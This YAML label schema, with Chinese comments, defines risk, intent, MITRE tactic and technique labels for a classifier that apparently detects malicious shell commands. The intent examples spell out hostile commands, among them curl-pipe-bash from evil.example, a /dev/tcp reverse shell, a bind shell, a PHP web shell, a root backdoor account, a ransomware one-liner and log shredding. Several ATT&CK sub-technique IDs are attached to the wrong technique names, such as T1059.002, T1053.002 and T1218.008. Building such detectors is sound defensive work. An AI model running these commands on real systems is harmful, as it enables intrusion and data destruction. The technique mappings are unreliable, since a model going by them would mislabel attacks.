# =============================================================================
# HyperIDs Label Schema — 全链路 contract
# Teacher (GLiClass) / Student (Tiny-GLiClass) / Red Team 共用此文件
# =============================================================================
# 修改规则：
#   1. 只允许在 major version 升级时增删 label（影响 Student 头部维度）
#   2. description 是 GLiClass label representation 的输入，必须清晰
#   3. technique 仅收录「可从 shell 命令/脚本直接判别」的子集，不是 MITRE 全集
# =============================================================================

version: "1.0.0"
task_type: multi_label_classification
encoding: utf-8

# -----------------------------------------------------------------------------
# 1. RISK — 互斥（训练时用 softmax 组，推理时独立 sigmoid 也可接受）
# -----------------------------------------------------------------------------
risk:
  - id: risk.benign
    description: >
      Legitimate administrative, operational, or development command with no
      malicious intent and no security impact.

  - id: risk.suspicious
    description: >
      Command exhibits dual-use or ambiguous characteristics — commonly seen
      in both benign administration and attacker workflows; context alone
      does not confirm malice.

  - id: risk.malicious
    description: >
      Command clearly performs offensive, evasive, destructive, or
      exfiltrative activity consistent with attacker tradecraft.

# -----------------------------------------------------------------------------
# 2. INTENT — 多标签；描述攻击者「想做什么」
# -----------------------------------------------------------------------------
intent:
  # --- 基础原子意图（可组合） ---
  - id: intent.download
    description: Download a file or payload from a remote source without executing it.
    examples:
      - curl -o /tmp/a.bin https://evil.example/a.bin
      - wget https://evil.example/payload.sh

  - id: intent.execute
    description: Execute a local file, script, or binary.
    examples:
      - chmod +x ./payload && ./payload
      - bash /opt/scripts/job.sh

  - id: intent.download_execute
    description: Download a remote payload and immediately execute it (dropper pattern).
    examples:
      - curl -fsSL https://evil.example/i.sh | bash
      - wget -qO- https://x/c.sh | sh

  - id: intent.encode_obfuscate
    description: Encode, encrypt, compress, or otherwise obfuscate content to evade detection.
    examples:
      - echo "aGk=" | base64 -d | bash
      - python3 -c "import base64;exec(base64.b64decode('...'))"

  - id: intent.file_operation
    description: Create, move, copy, rename, or delete files for staging, sabotage, or cleanup.
    examples:
      - cp /etc/shadow /tmp/.x
      - shred -u /var/log/auth.log

  - id: intent.process_inject
    description: Inject code or data into the memory of a running process.
    examples:
      - gdb -p 1234 -batch -ex "call dlopen(...)"
      - ptrace -p $PID

  - id: intent.network_scan
    description: Probe remote hosts or ports for open services and network topology.
    examples:
      - nmap -sS 10.0.0.0/24
      - for p in 22 80 443; do nc -zvw2 10.0.0.5 $p; done

  - id: intent.brute_force
    description: Attempt repeated credential guesses against a service.
    examples:
      - hydra -l admin -P rockyou.txt ssh://10.0.0.5
      - medusa -h target -u root -P passwords.txt -m ssh

  - id: intent.reverse_shell
    description: Establish an outbound reverse shell connecting back to an attacker listener.
    examples:
      - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
      - python3 -c 'socket...connect...dup2...'

  - id: intent.bind_shell
    description: Open a listening shell on a port for inbound attacker connections.
    examples:
      - nc -lvnp 4444 -e /bin/bash
      - ncat -l -p 4444 -e /bin/sh

  - id: intent.web_shell
    description: Upload, drop, or invoke a web shell on a web server.
    examples:
      - echo "<?php system($_GET['c']); ?>" > /var/www/html/s.php

  - id: intent.backdoor
    description: Install a persistent unauthorized access mechanism (backdoor account, rogue service, Trojanized binary).
    examples:
      - useradd -ou0 -g0 -p $(openssl passwd -1 pwn) hacker

  - id: intent.keylog
    description: Install or run keystroke / input capture tooling.
    examples:
      - strace -e read -p 1
      - apt-get install -y keyd

  - id: intent.ransomware
    description: Encrypt user data for extortion or inhibit recovery.
    examples:
      - find / -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc \;

  - id: intent.cryptomining
    description: Download or run cryptocurrency mining software.
    examples:
      - curl -fsSL https://pool.example/miner | sh

  - id: intent.data_staging
    description: Collect and consolidate data into an archive or staging location prior to exfiltration.
    examples:
      - tar czf /tmp/exfil.tgz /home/user/Documents
      - zip -r /tmp/data.zip /var/www

  - id: intent.disable_security
    description: Disable, weaken, or uninstall security controls (AV, EDR, firewall, SELinux, logging).
    examples:
      - systemctl stop firewalld && systemctl disable firewalld
      - setenforce 0

  - id: intent.clear_logs
    description: Clear or truncate logs and shell history to remove evidence.
    examples:
      - history -c && history -w
      - '> /var/log/syslog'

  - id: intent.timestomp
    description: Modify file timestamps to blend malicious artifacts with legitimate ones.
    examples:
      - touch -r /bin/ls /tmp/payload
      - timestomp payload.exe -m 2019:01:01

  - id: intent.add_account
    description: Create or modify user accounts for persistence or lateral access.
    examples:
      - useradd -m -s /bin/bash support
      - net user hacker P@ss /add

  - id: intent.modify_registry
    description: Modify Windows registry keys for persistence, configuration change, or defense evasion.
    examples:
      - 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v up /d payload.exe'

  - id: intent.service_creation
    description: Create or install a system service / daemon for persistence or execution.
    examples:
      - systemctl enable --now evil.service
      - 'sc create backdoor binPath= "C:\p.exe"'

  - id: intent.scheduled_task
    description: Create or modify a scheduled job / cron / timer for recurring execution.
    examples:
      - (crontab -l; echo "* * * * * /tmp/.x") | crontab -
      - schtasks /create /tn upd /tr payload.exe /sc minute /mo 5

  - id: intent.self_propagation
    description: Spread to other hosts or accounts via worm-like mechanisms (SSH keys, SMB, email).
    examples:
      - ssh-copy-id -i ~/.ssh/id_rsa.pub user@10.0.0.9

  - id: intent.environment_setup
    description: Install packages, toolchains, or dependencies to prepare the environment for later stages.
    examples:
      - apt-get install -y netcat-openbsd python3-pip

  - id: intent.file_transfer
    description: Transfer files between hosts over a network channel (SCP, SMB, FTP, HTTP PUT).
    examples:
      - scp payload user@10.0.0.9:/tmp/
      - smbclient //10.0.0.9/share -c "put p.exe"

  - id: intent.system_info
    description: Gather host, OS, network, or user information (reconnaissance on the local host).
    examples:
      - uname -a; id; ip a; cat /etc/os-release
      - systeminfo; whoami /all

  - id: intent.probe_security_tools
    description: Detect or fingerprint security products (AV, EDR, sandbox) present on the host.
    examples:
      - tasklist | findstr /i "crowdstrike sentinel"
      - ls /opt/crowdstrike 2>/dev/null

  # --- 高层战术意图（与 MITRE tactic 一一对应，供多粒度监督） ---
  - id: intent.reconnaissance
    description: Gather information about targets prior to compromise (external scanning, OSINT, phishing prep).

  - id: intent.initial_access
    description: Gain an initial foothold on a system or network.

  - id: intent.execution
    description: Execute attacker-controlled code on a system.

  - id: intent.persistence
    description: Maintain access across restarts, credential changes, or session termination.

  - id: intent.privilege_escalation
    description: Elevate from a lower-privilege account to a higher-privilege one.

  - id: intent.defense_evasion
    description: Avoid detection by security controls and analysis.

  - id: intent.credential_access
    description: Steal account names, passwords, tokens, or keys.

  - id: intent.discovery
    description: Explore the compromised environment to map resources and find further targets.

  - id: intent.lateral_movement
    description: Move from the compromised host to additional systems.

  - id: intent.collection
    description: Gather data of interest from the compromised host.

  - id: intent.command_and_control
    description: Establish or maintain bidirectional communication with attacker infrastructure.

  - id: intent.exfiltration
    description: Transfer collected data out of the environment.

  - id: intent.impact
    description: Manipulate, interrupt, or destroy systems and data.

# -----------------------------------------------------------------------------
# 3. MITRE TACTIC — Enterprise ATT&CK，多标签
# -----------------------------------------------------------------------------
tactic:
  - id: tactic.reconnaissance
    mitre_id: TA0043
    description: Gather information to plan and support an attack against a target.

  - id: tactic.resource_development
    mitre_id: TA0042
    description: Establish resources to support operations (infrastructure, accounts, capabilities).

  - id: tactic.initial_access
    mitre_id: TA0001
    description: Gain access to the target environment.

  - id: tactic.execution
    mitre_id: TA0002
    description: Run malicious code on a local or remote system.

  - id: tactic.persistence
    mitre_id: TA0003
    description: Maintain foothold across restarts, changed credentials, and other interruptions.

  - id: tactic.privilege_escalation
    mitre_id: TA0004
    description: Gain higher-level permissions to abuse elevated privileges.

  - id: tactic.defense_evasion
    mitre_id: TA0005
    description: Avoid detection and other controls to compromise and persist.

  - id: tactic.credential_access
    mitre_id: TA0006
    description: Steal account names and passwords.

  - id: tactic.discovery
    mitre_id: TA0007
    description: Explore the environment to understand and find resources.

  - id: tactic.lateral_movement
    mitre_id: TA0008
    description: Move through the environment to reach an objective.

  - id: tactic.collection
    mitre_id: TA0009
    description: Gather information of interest to the adversary.

  - id: tactic.command_and_control
    mitre_id: TA0011
    description: Communicate with compromised systems to control them.

  - id: tactic.exfiltration
    mitre_id: TA0010
    description: Steal data from the target network.

  - id: tactic.impact
    mitre_id: TA0040
    description: Manipulate, interrupt, or destroy systems and data.

# -----------------------------------------------------------------------------
# 4. MITRE TECHNIQUE — 仅收录「可从 shell 命令/脚本直接判别」的子集
#    description → GLiClass label representation 输入
#    commands_hint → Frontier LLM 标注/合成时的判别提示
# -----------------------------------------------------------------------------
technique:
  # === Execution ===
  - id: technique.T1059
    mitre_id: T1059
    tactic: tactic.execution
    name: Command and Scripting Interpreter
    description: Abuse command-line interpreters to execute commands, scripts, or binaries.
    commands_hint: Generic interpreter invocation without a more specific sub-technique signal.

  - id: technique.T1059.001
    mitre_id: T1059.001
    tactic: tactic.execution
    name: PowerShell
    description: Abuse PowerShell for execution, often with encoded or obfuscated commands.
    commands_hint: powershell.exe, pwsh, -EncodedCommand, IEX, Invoke-Expression.

  - id: technique.T1059.002
    mitre_id: T1059.002
    tactic: tactic.execution
    name: Windows Command Shell
    description: Abuse cmd.exe / batch scripts to execute commands on Windows.
    commands_hint: cmd.exe /c, batch scripts, caret-obfuscated cmd commands.

  - id: technique.T1059.003
    mitre_id: T1059.003
    tactic: tactic.execution
    name: Windows Management Instrumentation
    description: Execute commands or payloads through WMI.
    commands_hint: wmic, Get-WmiObject, Invoke-CimMethod, Win32_Process Create.

  - id: technique.T1059.004
    mitre_id: T1059.004
    tactic: tactic.execution
    name: Unix Shell
    description: Abuse sh, bash, zsh, dash, or other Unix shells to execute commands.
    commands_hint: bash -c, sh -c, eval, source of remote scripts, shell metacharacter chains.

  - id: technique.T1059.005
    mitre_id: T1059.005
    tactic: tactic.execution
    name: Visual Basic
    description: Execute code through Visual Basic scripts (VBS, VBScript, WSF).
    commands_hint: cscript, wscript, cscript.exe //E:vbscript, .vbs files.

  - id: technique.T1059.006
    mitre_id: T1059.006
    tactic: tactic.execution
    name: Python
    description: Execute code through the Python interpreter.
    commands_hint: python, python2, python3, -c with exec/import/eval, pickle loads.

  - id: technique.T1059.007
    mitre_id: T1059.007
    tactic: tactic.execution
    name: JavaScript
    description: Execute code through JavaScript interpreters (WScript, Node.js, JScript).
    commands_hint: cscript //E:jscript, node -e, jscript, ActiveXObject in scripts.

  - id: technique.T1059.008
    mitre_id: T1059.008
    tactic: tactic.execution
    name: Network Device CLI
    description: Abuse network device command-line interfaces to execute commands.
    commands_hint: expect scripts against routers/switches, CLI automation on network appliances.

  - id: technique.T1047
    mitre_id: T1047
    tactic: tactic.execution
    name: Windows Management Instrumentation
    description: Execute remote or local commands through the WMI service.
    commands_hint: wmic process call create, Invoke-WmiMethod, Win32_ProcessStartup.

  - id: technique.T1204
    mitre_id: T1204
    tactic: tactic.execution
    name: User Execution
    description: Rely on a user to execute a malicious file, link, or attachment.
    commands_hint: Double-click launch instructions, lures that require manual open/run.

  - id: technique.T1569
    mitre_id: T1569
    tactic: tactic.execution
    name: System Services
    description: Abuse system service mechanisms for execution.
    commands_hint: service start, launchctl exec, sc start with malicious binPath.

  - id: technique.T1569.002
    mitre_id: T1569.002
    tactic: tactic.execution
    name: Service Execution
    description: Execute a payload via a Windows service control manager.
    commands_hint: sc create with binPath to payload, Start-Service of rogue service.

  # === Persistence ===
  - id: technique.T1053
    mitre_id: T1053
    tactic: tactic.persistence
    name: Scheduled Task/Job
    description: Abuse task schedulers for recurring or delayed execution.
    commands_hint: crontab, at, schtasks, systemctl timer, launchd.

  - id: technique.T1053.002
    mitre_id: T1053.002
    tactic: tactic.persistence
    name: Cron
    description: Use cron jobs to schedule recurring command execution.
    commands_hint: crontab -e/-l, /etc/cron.*, anacron entries.

  - id: technique.T1053.003
    mitre_id: T1053.003
    tactic: tactic.persistence
    name: Scheduled Task
    description: Create or modify Windows Scheduled Tasks.
    commands_hint: schtasks /create, Register-ScheduledTask.

  - id: technique.T1053.005
    mitre_id: T1053.005
    tactic: tactic.persistence
    name: Systemd Timers
    description: Use systemd timers to schedule recurring execution on Linux.
    commands_hint: systemctl enable --now *.timer, systemd unit files for timers.

  - id: technique.T1543
    mitre_id: T1543
    tactic: tactic.persistence
    name: Create or Modify System Process
    description: Create or modify a system service or daemon to persist and execute.
    commands_hint: systemctl enable, sc create, launchctl load, service install.

  - id: technique.T1543.002
    mitre_id: T1543.002
    tactic: tactic.persistence
    name: Systemd Service
    description: Create or modify a systemd service unit for persistence.
    commands_hint: Writing to /etc/systemd/system/, systemctl daemon-reload && enable.

  - id: technique.T1543.003
    mitre_id: T1543.003
    tactic: tactic.persistence
    name: Windows Service
    description: Create or modify a Windows service for persistence.
    commands_hint: sc create, New-Service, schtasks with service context.

  - id: technique.T1547
    mitre_id: T1547
    tactic: tactic.persistence
    name: Boot or Logon Autostart Execution
    description: Configure auto-start entries to run code at boot or logon.
    commands_hint: Run keys, startup folders, launch agents/daemons, profile scripts.

  - id: technique.T1547.001
    mitre_id: T1547.001
    tactic: tactic.persistence
    name: Registry Run Keys / Startup Folder
    description: Achieve persistence via Run/RunOnce registry keys or the Startup folder.
    commands_hint: 'HKCU\...\Run, HKLM\...\Run, shell:startup folder drops.'

  - id: technique.T1547.006
    mitre_id: T1547.006
    tactic: tactic.persistence
    name: Kernel Modules and Extensions
    description: Load a malicious kernel module or extension for persistence and stealth.
    commands_hint: insmod, modprobe, /etc/modules-load.d/, kextutil.

  - id: technique.T1547.009
    mitre_id: T1547.009
    tactic: tactic.persistence
    name: Shortcut Modification
    description: Modify shortcuts to execute a malicious payload alongside a legitimate target.
    commands_hint: Editing .lnk targets, poisoned .desktop files.

  - id: technique.T1547.013
    mitre_id: T1547.013
    tactic: tactic.persistence
    name: XDG Autostart Entries
    description: Achieve persistence via XDG autostart desktop entries on Linux.
    commands_hint: ~/.config/autostart/*.desktop files.

  - id: technique.T1546
    mitre_id: T1546
    tactic: tactic.persistence
    name: Event Triggered Execution
    description: Persist by executing code in response to a system or application event.
    commands_hint: WMI event subscriptions, screensaver keys, shell rc file edits.

  - id: technique.T1546.004
    mitre_id: T1546.004
    tactic: tactic.persistence
    name: Unix Shell Configuration Modification
    description: Persist by modifying Unix shell configuration files (.bashrc, .profile).
    commands_hint: Appending curl|bash to .bashrc, .zshrc, /etc/profile.d/.

  - id: technique.T1546.008
    mitre_id: T1546.008
    tactic: tactic.persistence
    name: Accessibility Features
    description: Persist by replacing or hijacking accessibility binaries (sethc, utilman).
    commands_hint: Copying cmd.exe over sethc.exe, sticky keys backdoor.

  - id: technique.T1546.009
    mitre_id: T1546.009
    tactic: tactic.persistence
    name: AppCert DLLs
    description: Persist by planting a DLL that is loaded by all processes via AppCert DLLs.
    commands_hint: 'Writing to HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls.'

  - id: technique.T1546.010
    mitre_id: T1546.010
    tactic: tactic.persistence
    name: AppInit DLLs
    description: Persist by registering a DLL to load into every process that loads user32.dll.
    commands_hint: AppInit_DLLs registry value modification.

  - id: technique.T1546.015
    mitre_id: T1546.015
    tactic: tactic.persistence
    name: Component Object Model Hijacking
    description: Persist by executing a COM object with a replaced or hijacked CLSID.
    commands_hint: regsvr32 of hijacked COM, InprocServer32 path replacement.

  - id: technique.T1136
    mitre_id: T1136
    tactic: tactic.persistence
    name: Create Account
    description: Create a new account to maintain access.
    commands_hint: useradd, net user /add, Add-LocalGroupMember.

  - id: technique.T1136.001
    mitre_id: T1136.001
    tactic: tactic.persistence
    name: Local Account
    description: Create a local user account for persistent access.
    commands_hint: useradd, adduser, net user.

  - id: technique.T1098
    mitre_id: T1098
    tactic: tactic.persistence
    name: Account Manipulation
    description: Modify existing accounts to maintain or escalate access.
    commands_hint: usermod, net user ..., adding to sudo/admin groups, SSH key append.

  - id: technique.T1098.004
    mitre_id: T1098.004
    tactic: tactic.persistence
    name: SSH Authorized Keys
    description: Persist by adding attacker SSH keys to authorized_keys.
    commands_hint: echo ssh-rsa ... >> ~/.ssh/authorized_keys, authorized_keys overwrite.

  # === Privilege Escalation ===
  - id: technique.T1548
    mitre_id: T1548
    tactic: tactic.privilege_escalation
    name: Abuse Elevation Control Mechanism
    description: Bypass or abuse elevation controls to gain higher privileges.
    commands_hint: sudo abuse, SUID abuse, UAC bypass helpers.

  - id: technique.T1548.001
    mitre_id: T1548.001
    tactic: tactic.privilege_escalation
    name: Setuid and Setgid
    description: Abuse SUID/SGID binaries to execute code as a higher-privileged user.
    commands_hint: find / -perm -4000, chmod u+s, exploiting SUID binaries.

  - id: technique.T1548.002
    mitre_id: T1548.002
    tactic: tactic.privilege_escalation
    name: Bypass User Account Control
    description: Bypass Windows UAC to execute elevated commands.
    commands_hint: fodhelper, eventvwr UAC bypass, computerdefaults, SilentCleanup.

  - id: technique.T1548.003
    mitre_id: T1548.003
    tactic: tactic.privilege_escalation
    name: Sudo and Sudo Caching
    description: Abuse sudo or sudo caching for privilege escalation.
    commands_hint: sudo -l, sudo with wildcard/argument injection, sudoedit exploits.

  - id: technique.T1068
    mitre_id: T1068
    tactic: tactic.privilege_escalation
    name: Exploitation for Privilege Escalation
    description: Exploit a software vulnerability to escalate privileges.
    commands_hint: Known local exploit invocations (DirtyPipe, PwnKit, kernel exploits).

  - id: technique.T1134
    mitre_id: T1134
    tactic: tactic.privilege_escalation
    name: Access Token Manipulation
    description: Manipulate access tokens to run under a different security context.
    commands_hint: runas, token impersonation, DuplicateTokenEx, make Token.

  # === Defense Evasion ===
  - id: technique.T1027
    mitre_id: T1027
    tactic: tactic.defense_evasion
    name: Obfuscated Files or Information
    description: Hide or encode artifacts to avoid detection.
    commands_hint: base64, xor loops, string reversal, hex encoding in scripts.

  - id: technique.T1027.010
    mitre_id: T1027.010
    tactic: tactic.defense_evasion
    name: Command Obfuscation
    description: Obfuscate command content to evade signature and content inspection.
    commands_hint: Variable-split commands, $IFS substitution, brace expansion tricks, PowerShell -join/-replace chains.

  - id: technique.T1027.004
    mitre_id: T1027.004
    tactic: tactic.defense_evasion
    name: Compile After Delivery
    description: Deliver source code and compile on the target to evade file-based detection.
    commands_hint: gcc/g++/go build/mcs on downloaded source, javac then java.

  - id: technique.T1140
    mitre_id: T1140
    tactic: tactic.defense_evasion
    name: Deobfuscate/Decode Files or Information
    description: Decode encoded content at runtime to reveal the true payload.
    commands_hint: base64 -d | sh, certutil -decode, python marshal/pycdc decode, openssl enc -d.

  - id: technique.T1036
    mitre_id: T1036
    tactic: tactic.defense_evasion
    name: Masquerading
    description: Disguise artifacts as legitimate files or names.
    commands_hint: Renaming to system binary names, double extensions, right-to-left override.

  - id: technique.T1036.005
    mitre_id: T1036.005
    tactic: tactic.defense_evasion
    name: Match Legitimate Name or Location
    description: Place or name a binary to match a legitimate process or path.
    commands_hint: Dropping payloads in /usr/local/bin or System32 with benign names.

  - id: technique.T1218
    mitre_id: T1218
    tactic: tactic.defense_evasion
    name: System Binary Proxy Execution
    description: Execute payloads through signed or trusted system utilities (LOLBins).
    commands_hint: rundll32, regsvr32, mshta, certutil, msiexec, verclsid.

  - id: technique.T1218.004
    mitre_id: T1218.004
    tactic: tactic.defense_evasion
    name: InstallUtil
    description: Execute code via the InstallUtil utility.
    commands_hint: 'InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll.'

  - id: technique.T1218.005
    mitre_id: T1218.005
    tactic: tactic.defense_evasion
    name: Mshta
    description: Execute HTA / JavaScript payloads via mshta.exe.
    commands_hint: mshta http://.../payload.hta, mshta vbscript:Execute(...).

  - id: technique.T1218.008
    mitre_id: T1218.008
    tactic: tactic.defense_evasion
    name: Regsvr32
    description: Register and execute payloads via regsvr32.dll registration.
    commands_hint: 'regsvr32 /s /n /u /i:http://... scrobj.dll.'

  - id: technique.T1218.009
    mitre_id: T1218.009
    tactic: tactic.defense_evasion
    name: Rundll32
    description: Execute DLL entry points via rundll32.exe.
    commands_hint: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";...

  - id: technique.T1218.014
    mitre_id: T1218.014
    tactic: tactic.defense_evasion
    name: Msiexec
    description: Execute malicious MSI packages via msiexec.exe.
    commands_hint: msiexec /q /i http://.../p.msi.

  - id: technique.T1070
    mitre_id: T1070
    tactic: tactic.defense_evasion
    name: Indicator Removal
    description: Delete or modify artifacts to evade detection.
